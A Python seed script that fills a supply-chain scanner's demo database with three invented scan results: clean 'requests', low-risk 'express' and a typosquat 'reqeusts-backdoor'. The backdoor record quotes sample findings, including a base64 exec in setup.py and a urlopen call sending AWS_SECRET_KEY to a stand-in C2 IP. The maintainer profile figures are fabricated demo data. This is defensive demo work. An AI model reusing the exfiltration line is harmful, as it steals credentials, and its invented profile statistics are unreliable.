"""
seed_demo.py - Pre-populate realistic sample scans for demo & viva presentation
=============================================================================
Adds:
1. 'requests' (PyPI Clean - Green Badge, Score 0, Verified Maintainer)
2. 'express' (npm Suspicious Reflection - Yellow/Low Badge, Score 18, Verified Author)
3. 'reqeusts-backdoor' (PyPI High Threat Typosquatting & Exfiltration - Red Badge, Score 100, Ghost Author)
"""

import scanner
import osint_analyzer
from app import get_db_connection, save_scan_to_db, init_db

init_db()

# Clear previous scans to have clean, perfectly formed records
with get_db_connection() as conn:
    conn.execute("DELETE FROM scans")
    conn.commit()

# ---------------------------------------------------------------------------
# 1. Clean Package: requests (PyPI)
# ---------------------------------------------------------------------------
clean_meta = {
    "package_name": "requests",
    "ecosystem": "pypi",
    "author": "Kenneth Reitz",
    "author_email": "me@kennethreitz.org",
    "version": "2.31.0",
    "license": "Apache-2.0",
    "homepage": "https://requests.readthedocs.io",
    "repository": "https://github.com/psf/requests",
    "registry_url": "https://pypi.org/project/requests/",
}
clean_osint = {
    "username": "kennethreitz",
    "accounts_found": 4,
    "profiles": [
        {"platform": "GitHub", "category": "Source Control", "url": "https://github.com/kennethreitz", "status": "Active (128 repos, 34k followers)", "verified": True},
        {"platform": "HackerNews", "category": "Tech Community", "url": "https://news.ycombinator.com/user?id=kennethreitz", "status": "Active Member (4100 karma)", "verified": True},
        {"platform": "npm Registry", "category": "Package Ecosystem", "url": "https://www.npmjs.com/~kennethreitz", "status": "Published 6 package(s)", "verified": True},
        {"platform": "Twitter/X", "category": "Social Presence", "url": "https://twitter.com/kennethreitz", "status": "Verified Account", "verified": True},
    ],
    "reputation_score": 95,
    "reputation_verdict": "VERIFIED / ESTABLISHED MAINTAINER",
    "badge_class": "low",
    "summary": "Author 'kennethreitz' has an established public developer identity across 4 platforms. High reputational trust.",
    "is_ghost_author": False,
}
clean_cats = {"Initial Access": 0, "Execution & Hooks": 0, "Evasion & Obfuscation": 0, "Data Exfiltration": 0}
clean_scan = {
    "package": "requests",
    "ecosystem": "pypi",
    "score": 0,
    "verdict": "LOW RISK",
    "badge_class": "low",
    "summary": "No malicious indicators or suspicious heuristics were flagged by GuardDog. Package appears clean and compliant.",
    "issues_count": 0,
    "category_scores": clean_cats,
    "flagged_rules": [],
    "registry_url": clean_meta["registry_url"],
    "metadata": clean_meta,
    "author_osint": clean_osint,
    "audit_report_md": scanner.generate_markdown_audit_report("requests", "pypi", 0, "LOW RISK", "No malicious indicators found. Safe for production dependencies.", clean_cats, [], clean_meta, clean_osint),
    "raw_json_str": '{"package": "requests", "issues": 0, "errors": {}, "results": {}}'
}
save_scan_to_db(clean_scan)

# ---------------------------------------------------------------------------
# 2. Flagged Package: express (npm)
# ---------------------------------------------------------------------------
express_meta_pkg = {
    "package_name": "express",
    "ecosystem": "npm",
    "author": "TJ Holowaychuk",
    "author_email": "tj@vision-media.ca",
    "version": "4.18.2",
    "license": "MIT",
    "homepage": "http://expressjs.com/",
    "repository": "https://github.com/expressjs/express",
    "registry_url": "https://www.npmjs.com/package/express",
}
express_osint = {
    "username": "tj",
    "accounts_found": 3,
    "profiles": [
        {"platform": "GitHub", "category": "Source Control", "url": "https://github.com/tj", "status": "Active (240 repos, 52k followers)", "verified": True},
        {"platform": "npm Registry", "category": "Package Ecosystem", "url": "https://www.npmjs.com/~tj", "status": "Published 200+ package(s)", "verified": True},
        {"platform": "HackerNews", "category": "Tech Community", "url": "https://news.ycombinator.com/user?id=tj", "status": "Active Member (8500 karma)", "verified": True},
    ],
    "reputation_score": 95,
    "reputation_verdict": "VERIFIED / ESTABLISHED MAINTAINER",
    "badge_class": "low",
    "summary": "Author 'tj' has an established public developer identity across 3 platforms. Verified open-source pillar.",
    "is_ghost_author": False,
}
express_meta = scanner.RULE_CATALOG["npm-api-obfuscation"]
express_rule = {
    "rule_id": "npm-api-obfuscation",
    "name": express_meta["name"],
    "severity": express_meta["severity"],
    "weight": express_meta["weight"],
    "category": express_meta["category"],
    "mitre_tactic": express_meta["mitre_tactic"],
    "mitre_technique": express_meta["mitre_technique"],
    "mitre_url": express_meta["mitre_url"],
    "description": express_meta["description"],
    "remediation": express_meta["remediation"],
    "plain_detection": "The package uses JavaScript reflection (route[method].apply) to dispatch HTTP verbs dynamically.",
    "risk_impact": "Dynamic method calls can occasionally be abused by attackers to conceal payload execution from naive pattern matching.",
    "what_to_do": "Review method mapping tables. For mature frameworks like Express, dynamic method binding is safe standard architecture.",
    "findings": [
        {"location": "package/lib/application.js:479", "code": "route[method].apply(route, slice.call(arguments, 1));", "message": "Dynamic method invocation via reflection (evasion pattern)"},
        {"location": "package/lib/response.js:589", "code": "obj[key](req, this, next);", "message": "Dynamic property method invocation"}
    ]
}
express_cats = {"Initial Access": 0, "Execution & Hooks": 0, "Evasion & Obfuscation": 18, "Data Exfiltration": 0}
express_scan = {
    "package": "express",
    "ecosystem": "npm",
    "score": 18,
    "verdict": "LOW RISK",
    "badge_class": "low",
    "summary": "LOW RISK: 1 minor heuristic(s) triggered with low security impact. Package uses dynamic function dispatch.",
    "issues_count": 1,
    "category_scores": express_cats,
    "flagged_rules": [express_rule],
    "registry_url": express_meta_pkg["registry_url"],
    "metadata": express_meta_pkg,
    "author_osint": express_osint,
    "audit_report_md": scanner.generate_markdown_audit_report("express", "npm", 18, "LOW RISK", "LOW RISK: 1 minor heuristic triggered.", express_cats, [express_rule], express_meta_pkg, express_osint),
    "raw_json_str": '{"package": "express", "issues": 1}'
}
save_scan_to_db(express_scan)

# ---------------------------------------------------------------------------
# 3. High-Risk Threat: reqeusts-backdoor (PyPI Typosquat & Backdoor)
# ---------------------------------------------------------------------------
high_meta_pkg = {
    "package_name": "reqeusts-backdoor",
    "ecosystem": "pypi",
    "author": "shadow_ops_temp99",
    "author_email": "throwaway9912@tempmail.com",
    "version": "0.1.0",
    "license": "Not specified",
    "homepage": "",
    "repository": "",
    "registry_url": "https://pypi.org/project/reqeusts-backdoor/",
}
high_osint = {
    "username": "shadow_ops_temp99",
    "accounts_found": 0,
    "profiles": [],
    "reputation_score": 15,
    "reputation_verdict": "GHOST / BURNER PROFILE",
    "badge_class": "high",
    "summary": "CRITICAL WARNING: Author 'shadow_ops_temp99' has NO verifiable open-source presence across major developer registries. Strongly correlated with disposable accounts used in malware campaigns.",
    "is_ghost_author": True,
}
typo_meta = scanner.RULE_CATALOG["typosquatting"]
exfil_meta = scanner.RULE_CATALOG["exfiltrate-sensitive-data"]
b64_meta = scanner.RULE_CATALOG["exec-base64"]
high_rules = [
    {
        "rule_id": "typosquatting",
        "name": typo_meta["name"],
        "severity": "High",
        "weight": 30,
        "category": typo_meta["category"],
        "mitre_tactic": typo_meta["mitre_tactic"],
        "mitre_technique": typo_meta["mitre_technique"],
        "mitre_url": typo_meta["mitre_url"],
        "description": typo_meta["description"],
        "remediation": typo_meta["remediation"],
        "plain_detection": "The package name 'reqeusts-backdoor' is deceptively similar to popular library 'requests'.",
        "risk_impact": "Developers who make a simple typo install malicious backdoors into development machines or CI/CD pipelines.",
        "what_to_do": "Remove immediately and verify requirements.txt for typos.",
        "findings": [{"location": "Registry Metadata", "code": "", "message": "Package mimics legitimate popular library 'requests'"}]
    },
    {
        "rule_id": "exec-base64",
        "name": b64_meta["name"],
        "severity": "High",
        "weight": 35,
        "category": b64_meta["category"],
        "mitre_tactic": b64_meta["mitre_tactic"],
        "mitre_technique": b64_meta["mitre_technique"],
        "mitre_url": b64_meta["mitre_url"],
        "description": b64_meta["description"],
        "remediation": b64_meta["remediation"],
        "plain_detection": "setup.py executes base64-decoded binary payload dynamically upon install.",
        "risk_impact": "Bypasses static code reviews and executes arbitrary machine-level commands before dependencies are imported.",
        "what_to_do": "Quarantine the host. Do not run pip install on this package without sandbox isolation.",
        "findings": [{"location": "setup.py:14", "code": 'exec(base64.b64decode(b"aW1wb3J0IHNvY2tldC4uLg=="))', "message": "Dynamic execution of base64 obfuscated payload detected"}]
    },
    {
        "rule_id": "exfiltrate-sensitive-data",
        "name": exfil_meta["name"],
        "severity": "High",
        "weight": 35,
        "category": exfil_meta["category"],
        "mitre_tactic": exfil_meta["mitre_tactic"],
        "mitre_technique": exfil_meta["mitre_technique"],
        "mitre_url": exfil_meta["mitre_url"],
        "description": exfil_meta["description"],
        "remediation": exfil_meta["remediation"],
        "plain_detection": "The code extracts environment variables including AWS_SECRET_KEY and sends them to a remote IP.",
        "risk_impact": "Catastrophic credential theft: AWS root keys and secrets are leaked to attacker C2 servers.",
        "what_to_do": "Rotate all AWS, cloud, database, and API keys immediately. Check network egress logs.",
        "findings": [{"location": "reqeusts/__init__.py:8", "code": 'urllib.request.urlopen("http://198.51.100.23/c2?t=" + os.environ["AWS_SECRET_KEY"])', "message": "Unauthorized exfiltration of environment secret AWS_SECRET_KEY"}]
    }
]
high_cats = {"Initial Access": 30, "Execution & Hooks": 0, "Evasion & Obfuscation": 35, "Data Exfiltration": 35}
high_scan = {
    "package": "reqeusts-backdoor",
    "ecosystem": "pypi",
    "score": 100,
    "verdict": "HIGH RISK",
    "badge_class": "high",
    "summary": "CRITICAL THREAT: 3 High-severity rules triggered. Severe supply chain backdoor with active exfiltration, obfuscation, and typosquatting mimicry. DO NOT INSTALL.",
    "issues_count": 3,
    "category_scores": high_cats,
    "flagged_rules": high_rules,
    "registry_url": high_meta_pkg["registry_url"],
    "metadata": high_meta_pkg,
    "author_osint": high_osint,
    "audit_report_md": scanner.generate_markdown_audit_report("reqeusts-backdoor", "pypi", 100, "HIGH RISK", "CRITICAL THREAT: Severe supply chain backdoor.", high_cats, high_rules, high_meta_pkg, high_osint),
    "raw_json_str": '{"package": "reqeusts-backdoor", "issues": 3}'
}
save_scan_to_db(high_scan)

print("Sample scans successfully seeded into SQLite database with full metadata & Maigret OSINT footprints.")
